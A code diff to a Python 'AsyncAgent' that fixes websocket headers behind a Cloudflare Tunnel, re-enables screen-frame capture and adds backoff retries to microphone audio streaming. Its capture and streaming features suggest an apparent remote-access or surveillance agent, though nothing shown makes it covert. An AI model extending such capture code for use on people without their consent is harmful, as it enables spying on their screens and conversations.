@@ -102,17 +102,28 @@ class AsyncAgent:
     async def _fix_headers(self, connection, request):
         """Hook to fix headers from Cloudflare Tunnel (forces Connection: Upgrade)"""
         try:
-            # Check if this is the new Request object or old headers dict
+            # Create mutable copy
+            # Attempt to mutate in-place first to preserve type
             headers = getattr(request, 'headers', request)
             
-            # Manually force Upgrade headers to satisfy strict checks
-            # Delete first to prevent "websocket, websocket" duplication if it already exists
-            # con mẹ nó
-            if 'Connection' in headers: del headers['Connection']
-            if 'Upgrade' in headers: del headers['Upgrade']
-            
-            headers['Connection'] = 'Upgrade'
-            headers['Upgrade'] = 'websocket'
+            try:
+                # Try direct mutation (works for dict and some mutable mappings)
+                if 'Connection' in headers: del headers['Connection']
+                if 'Upgrade' in headers: del headers['Upgrade']
+                headers['Connection'] = 'Upgrade'
+                headers['Upgrade'] = 'websocket'
+            except TypeError:
+                # If immutable (e.g. websockets.datastructures.Headers), try replacement with dict
+                # Note: This changes the type to dict, which might have side effects but usually works for simple servers
+                new_headers = dict(headers)
+                if 'Connection' in new_headers: del new_headers['Connection']
+                if 'Upgrade' in new_headers: del new_headers['Upgrade']
+                new_headers['Connection'] = 'Upgrade'
+                new_headers['Upgrade'] = 'websocket'
+                
+                if hasattr(request, 'headers'):
+                    request.headers = new_headers
+                
         except Exception as e:
             print(f"[!] Header Fix Validation Warning: {e}")
         return None  # Continue with connection
@@ -446,8 +457,8 @@ class AsyncAgent:
                     continue
                 
                 start_time = asyncio.get_running_loop().time()
-                # jpeg = await self.loop.run_in_executor(None, self.capturer.get_frame_bytes)
-                jpeg = None # DISABLED FOR LOCAL TESTING (NO MIRROR)
+                jpeg = await self.loop.run_in_executor(None, self.capturer.get_frame_bytes)
+                # jpeg = None # DISABLED FOR LOCAL TESTING (NO MIRROR)
                 if jpeg:
                     header = bytes([protocol.OP_IMG_FRAME])
                     pending_send = asyncio.create_task(send_msg(ws_to_use, header + jpeg))
@@ -482,6 +493,9 @@ class AsyncAgent:
     async def stream_mic(self, target_ws=None):
         print("[*] Mic Streaming Task Started")
         ws_to_use = target_ws if target_ws else self.ws
+        restart_attempts = 0
+        restart_attempts = 0
+        MAX_RESTARTS = 3
         failures = 0
         try:
             while self.mic_streaming:
@@ -489,6 +503,7 @@ class AsyncAgent:
                     chunk = await self.loop.run_in_executor(None, self.mic.get_chunk)
                     if chunk:
                         failures = 0 # Reset counter on success
+                        restart_attempts = 0 # Reset restarts
                         header = bytes([protocol.OP_AUDIO_CHUNK])
                         await send_msg(ws_to_use, header + chunk)
                     else:
@@ -498,13 +513,22 @@ class AsyncAgent:
                     print(f"[-] Mic Read Error ({failures}): {e}")
                     # If it's a fatal error, try to restart the stream
                     if failures > 5:
-                        print("[!] restarting Mic Stream...")
+                        if restart_attempts >= MAX_RESTARTS:
+                            print("[!] Mic Max Restarts Reached. Aborting.")
+                            break
+                            
+                        print(f"[!] Restarting Mic Stream (Attempt {restart_attempts+1}/{MAX_RESTARTS})...")
                         self.mic.stop()
-                        await asyncio.sleep(1)
+                        
+                        # Exponential Backoff
+                        await asyncio.sleep(2 ** restart_attempts)
+                        restart_attempts += 1
+                        
                         if self.mic.start():
                             failures = 0
                         else:
-                            await asyncio.sleep(2)
+                            print("[-] Failed to restart Mic Stream")
+                            # Don't reset failures, let it loop and retry or fail
                     
                     await asyncio.sleep(0.1)
                 
